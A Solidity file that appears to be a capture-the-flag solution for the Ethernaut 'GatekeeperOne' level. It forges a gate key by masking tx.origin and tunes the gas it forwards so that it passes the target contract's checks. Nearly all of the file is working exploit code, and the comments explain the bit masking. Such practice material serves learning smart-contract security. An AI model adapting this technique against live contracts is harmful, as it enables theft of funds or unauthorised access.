// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import '@openzeppelin/contracts/math/SafeMath.sol';

import "./GatekeeperOne.sol";


contract GatekeeperOneExploit{
    using SafeMath for uint256;
    GatekeeperOne public gate;
    constructor (address _gate) public{
        gate=GatekeeperOne(_gate);
    }

    function exploitGatekeeper(uint256 n) public {
        require(n>=3, "n should be grater/equal than 3");

        //Convert tx.origin to bytes8
        bytes8 preKey=bytes8(uint64(uint160(tx.origin)));

        // We need to mask the key, this means mantaining certain bit value and transform others to 0
        // & is the AND operator for each bit, meaning it will return 1 for a bit only if both are equal to 1.
        // When we convert a bytes8 to a shorter data type, the value is left cut
        // bytes8 is a 8*8=64 bits value, meaning that it hex representation contain 16 hex chars
        // uint64(key)=bytes8(key)
        // if key =0x12345678ABCDEF12 (bytes8) then uint32(key)=0x00000000ABCDEF12
        // uint32(uint64(key))=uint32(key)= 0x00000000FFFFFFFF & key: lef half of the key will be converted to 0 in the & operation, while the other part while stay as one if and only if the key bit is equal to 1
        // uint16(uint64(_gateKey))=
        // 0xFFFFFFF00000FFFF
        
        bytes8 key=bytes8(preKey) & 0xFFFFFFF00000FFFF;
        //254 is the gas consumed until gasleft() is called according to remix debugger 
        gate.enter.gas(8191*n+254)(key);
    }
}